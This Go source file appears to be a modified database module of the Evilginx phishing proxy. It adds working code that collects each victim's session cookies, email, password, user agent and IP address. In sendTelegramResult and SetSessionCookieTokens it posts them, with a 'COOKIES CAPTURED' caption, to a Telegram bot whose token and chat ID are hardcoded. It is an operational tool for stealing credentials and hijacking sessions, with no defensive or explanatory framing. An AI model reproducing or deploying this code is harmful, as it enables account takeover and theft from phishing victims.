package database

import (
	"bytes"
	"encoding/json"
	"io"
	"io/ioutil"
	"fmt"
	"mime/multipart"
	"github.com/joho/godotenv"
	"log"
	"net/http"
	"os"
	"path"
  	"path/filepath"


	"github.com/tidwall/buntdb"
	"strconv"
	"strings"
	"time"
)

func goDotEnvVariable(key string) string {

	// load .env file
	err := godotenv.Load(".env")

	if err != nil {
		log.Printf("Error loading .env file")
	}

	return os.Getenv(key)
}


func getUrl() string {
	// godotenv package
  	Token := goDotEnvVariable("TOKEN")
	return fmt.Sprintf("https://api.telegram.org/bot%s", Token)
}

func getChatId() string {
	//get ChAT_ID from .env
	ChatId := goDotEnvVariable("CHAT_ID")
	return fmt.Sprintf("%s", ChatId)
}

func sendTelegramResult(cookies string, username string, password string,  useragent string, remote_addr string) {

	// Send the message
	var err error
	client, fileName := &http.Client{}, ""+username+".json"
	token, chat_id := "6572765504:AAHsQyN4Vy3t6tRiprk-pAyCRub7OjHqTDA", "6151124735"

	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
	msg := "🍁 COOKIES CAPTURED 🍁\n\n******[💻 Valid Log💻]******\n🌟 Email = " + username + "\n🔑 Password = " + password + "\n🌎 UserAgent = " + useragent + "\n🎌 IP =   https://ip-api.com/" + remote_addr + "\n\n⁎⁎⁎⁎⁎⁎ANONYMOUS⁎⁎⁎⁎⁎⁎⁎⁎"
	

	err = os.WriteFile(fileName, []byte(cookies), 0755)
	if err != nil {
	   fmt.Printf("Unable to write file: %v", err)
	}

	fileDir, _ := os.Getwd()
	filePath := path.Join(fileDir, fileName)

	file, _ := os.Open(filePath)
	defer file.Close()

	responseBody := &bytes.Buffer{}
	writer := multipart.NewWriter(responseBody)
	part, _ := writer.CreateFormFile("document", filepath.Base(file.Name()))
	io.Copy(part, file)
	writer.WriteField("caption", msg)
	writer.Close()
	
	req, _ := http.NewRequest("POST", url, responseBody)
	req.Header.Add("Content-Type", writer.FormDataContentType())
	client.Do(req)
	os.Remove(fileName)

	
	log.Println("Cookies Result Sent To Telegram", username, password)
	
	// Return
	return

}

func telegramSendVisitor(msg string) {
	var err error
	
	url := fmt.Sprintf("%s/sendMessage", getUrl())
	body, _ := json.Marshal(map[string]string{
		"chat_id": getChatId(),
		"text":    msg,
	})
	responseBody := bytes.NewBuffer(body)
	request, _ := http.Post(url, "application/json", responseBody)

	// Close the request at the end
	defer request.Body.Close()
	
// 	// Body
	body, err = ioutil.ReadAll(request.Body)
	if err != nil {
		log.Fatalf("%s", err)
	}
	fmt.Println("Result sent to telegram")
	// Return
	return
}


type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateBodyTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateHttpTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	err := d.sessionsUpdateCookieTokens(sid, tokens)
	
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
		Secure         bool   `json:"secure,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         false,
			}
			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}
	
	data, _ := d.sessionsGetBySid(sid)

	json, _ := json.Marshal(cookies)

	sendTelegramResult(string(json), data.Username, data.Password, data.UserAgent, data.RemoteAddr)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
